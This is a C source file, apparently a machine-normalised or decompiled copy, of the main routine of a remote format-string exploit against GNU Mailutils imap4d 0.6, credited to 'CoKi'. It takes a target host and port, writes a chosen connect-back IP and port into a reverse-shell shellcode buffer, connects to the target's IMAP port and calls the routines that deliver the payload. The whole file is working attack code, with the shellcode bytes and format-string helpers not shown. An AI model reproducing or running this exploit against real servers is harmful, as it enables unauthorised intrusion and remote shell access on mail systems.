#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char EOF ; 
 int ERROR ; 
 unsigned int IMAPD ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TIMEOUT ; 
 void* FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *,int) ; 
 scalar_t__ cback ; 
 int* conn_back ; 
 int FUNC2 (int,struct sockaddr*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,unsigned int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 struct hostent* FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,unsigned int) ; 
 char FUNC8 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (unsigned int) ; 
 int FUNC11 (char*) ; 
 char* FUNC12 (struct in_addr) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int rhost ; 
 int rport ; 
 scalar_t__ shsize ; 
 int FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC16 (int*) ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 

int FUNC18(int argc, char *argv[]) { 
	char opt, *host=NULL, *rh=NULL;
	int sockfd;
	unsigned int imapdport=IMAPD;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	FUNC14("\n GNU Mailutils imap4d v0.6 remote format string exploit\n");
	FUNC14(" by CoKi <coki@nosystem.com.ar>\n\n");

	while((opt = FUNC8(argc,argv,"h:p:c:b:")) != EOF) {
		switch (opt) {
			case 'h':
				host = optarg;
				break;
			case 'p':
				imapdport = FUNC0(optarg);
				break;
			case 'c':
				rhost = FUNC11(optarg);
				rh = optarg;
				cback++;
				break;
			case 'b':
				rport = FUNC0(optarg);
				break;
			default:
				FUNC17(argv[0]);
				break;
		}
	}

	if(host == NULL) FUNC17(argv[0]);

	if(cback) {
		FUNC14(" [*] verifying your host\t:");
		FUNC5(stdout);

		if((he=FUNC6(rh)) == NULL) {
			FUNC9(" gethostbyname()");
			FUNC14("\n");
			FUNC3(1);
		}

		shsize = FUNC16(conn_back);

		conn_back[33]=(rhost & 0x000000ff);
		conn_back[34]=(rhost & 0x0000ff00) >> 8;
		conn_back[35]=(rhost & 0x00ff0000) >> 16;
		conn_back[36]=(rhost & 0xff000000) >> 24;

		conn_back[39]=(rport & 0xff00) >> 8;
		conn_back[40]=(rport & 0x00ff);

		FUNC14(" %s\n", FUNC12(*((struct in_addr *)he->h_addr)));
		FUNC14(" [*] connect back port\t\t: %u\n", rport);
	}

	if(FUNC16(conn_back) < shsize) {
		FUNC14("\n [!] failed! your host or port contain null-bytes\n\n");
		FUNC3(1);
	}

	FUNC14(" [*] verifying target host\t:");

	if((he=FUNC6(host)) == NULL) {
		FUNC9(" gethostbyname()");
		FUNC14("\n");
		FUNC3(1);
        }

	FUNC14(" %s\n", FUNC12(*((struct in_addr *)he->h_addr)));
	FUNC14(" [*] target imapd port\t\t: %u\n\n", imapdport);

	FUNC14(" [*] connecting...\t\t:");
	FUNC5(stdout);

	if((sockfd=FUNC15(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		FUNC13(" socket()");
		FUNC14("\n");
		FUNC3(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = FUNC10(imapdport);
	dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
	FUNC1(&(dest_dir.sin_zero), 8);

	if(FUNC2(sockfd, (struct sockaddr *)&dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {

		FUNC14(" closed\n\n");
		FUNC3(1);
        }

	FUNC14(" done!\n\n");

	FUNC7(host, imapdport);

	FUNC4(host, imapdport);
}